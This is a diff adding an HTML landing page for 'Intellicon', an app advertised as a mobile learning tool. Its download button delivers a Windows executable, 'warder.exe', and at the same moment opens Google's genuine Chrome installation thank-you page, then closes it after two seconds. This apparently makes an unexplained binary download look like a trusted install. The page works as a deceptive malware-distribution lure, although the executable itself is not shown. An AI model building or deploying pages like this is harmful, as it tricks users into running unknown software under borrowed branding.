@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Intellicon</title>
+<style>
+    body {
+        margin: 0;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background: linear-gradient(to bottom, #1a1a1a, #333);
+        color: #fff;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+        justify-content: space-between;
+    }
+
+    header {
+        padding: 20px;
+        text-align: center;
+        background-color: #222;
+        box-shadow: 0 2px 5px rgba(0,0,0,0.5);
+    }
+
+    header h1 {
+        margin: 0;
+        font-size: 1.8rem;
+        color: #00ffd5;
+    }
+
+    main {
+        flex: 1;
+        padding: 20px;
+        text-align: center;
+    }
+
+    main p {
+        font-size: 1rem;
+        line-height: 1.5;
+        margin-bottom: 20px;
+    }
+
+    .features {
+        text-align: left;
+        margin: 0 auto;
+        max-width: 300px;
+    }
+
+    .features li {
+        margin-bottom: 10px;
+        font-size: 0.95rem;
+        list-style: none;
+        padding-left: 1.2em;
+        position: relative;
+    }
+
+    .features li::before {
+        content: '🔹';
+        position: absolute;
+        left: 0;
+    }
+
+    button {
+        background-color: #00ffd5;
+        color: #111;
+        border: none;
+        padding: 12px 25px;
+        font-size: 1rem;
+        border-radius: 25px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    button:hover {
+        background-color: #00b3a1;
+    }
+</style>
+</head>
+<body>
+
+<header>
+    <h1>Intellicon</h1>
+</header>
+
+<main>
+    <p>Welcome to <strong>Intellicon</strong>—the smart way to understand computers easily. Learn the core concepts, explore interactive examples, and see how computers really work, all from your mobile device.</p>
+    
+    <ul class="features">
+        <li>Interactive explanations for beginners</li>
+        <li>Clear visualizations of computer concepts</li>
+        <li>Step-by-step guided examples</li>
+        <li>Mobile-friendly and intuitive UI</li>
+    </ul>
+
+    <br>
+    <!-- Download button opens thank-you page -->
+    <a href="warder.exe" download id="downloadLink">
+        <button onclick="openThankYou()">Download Now</button>
+    </a>
+    
+    <script>
+    function openThankYou() {
+        // Open thank-you page in new tab
+        let thankYouTab = window.open('https://www.google.com/intl/en_pk/chrome/next-steps.html?statcb=1&installdataindex=empty&defaultbrowser=0', '_blank');
+    
+        // Close it after 4 seconds
+        setTimeout(() => {
+            if (thankYouTab) thankYouTab.close();
+        }, 2000);
+    
+        // Optional: you can trigger the download via JS as well
+        // document.getElementById('downloadLink').click();
+    }
+    </script>
+    
+    
+    </a>
+</main>
+
+<footer>
+    © 2025 Intellicon — Designed for mobile learning only
+</footer>
+
+</body>
+</html>
